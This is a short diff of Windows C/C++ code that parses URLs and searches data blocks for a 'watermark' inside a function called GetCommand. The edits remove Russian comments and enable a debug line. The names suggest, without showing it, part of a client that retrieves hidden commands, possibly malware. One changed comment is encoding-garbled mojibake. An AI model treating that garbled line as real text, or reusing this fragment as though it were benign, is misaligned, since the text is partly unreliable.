@@ -257,7 +257,7 @@ BOOL GetCommand(PCHAR pCommandOutput, LPWSTR pUserId)
 					}
 					else
 					{
-						//dbg("Watermark not found in this block");
+						dbg("Watermark not found in this block");
 					}
 					if (bRet)
 					{
@@ -292,10 +292,10 @@ BOOL IsCorrect(PWCHAR RequestUrl)
 		return FALSE;
 
 
-	if (RequestUrl != lpHttpStart) // если не начинается с http:// то нам втирают какую-то дичь
+	if (RequestUrl != lpHttpStart) 
 		return FALSE;
 
-	RequestUrl += 7; // обрезаем http:// к чертям
+	RequestUrl += 7; 
 	
 	for (INT i = 0; i < lstrlenW(RequestUrl); i++)
 	{
@@ -304,7 +304,7 @@ BOOL IsCorrect(PWCHAR RequestUrl)
 		else if (RequestUrl[i] == L'/')
 			bSlash = TRUE;
 	}
-	return ((bDot) && (bSlash)); // если нашли и точку и слеш, то наверное ( именно наверное ) все ок, а там хз. Но вылета не будет, надеюсь.
+	return ((bDot) && (bSlash)); 
 }
 
 class RAII_VirtualAlloc
@@ -328,7 +328,7 @@ private:
 
 BOOL GetDomainPart(PWCHAR pOut, PWCHAR RequestUrl, DWORD dwLen)
 {
-	RequestUrl += 7; // обрезаем http://
+	RequestUrl += 7; // Г®ГЎГ°ГҐГ§Г ГҐГ¬ http://
 	lstrcpyW(pOut, RequestUrl);
 
 	for (INT i = 0; i < lstrlenW(RequestUrl); i++)
@@ -345,7 +345,7 @@ BOOL GetDomainPart(PWCHAR pOut, PWCHAR RequestUrl, DWORD dwLen)
 
 BOOL GetScriptPart(PWCHAR pOut, PWCHAR RequestUrl, DWORD dwLen)
 {
-	RequestUrl += 7; // обрезаем http://
+	RequestUrl += 7; 
 
 	for (INT i = 0; i < lstrlenW(RequestUrl); i++)
 	{
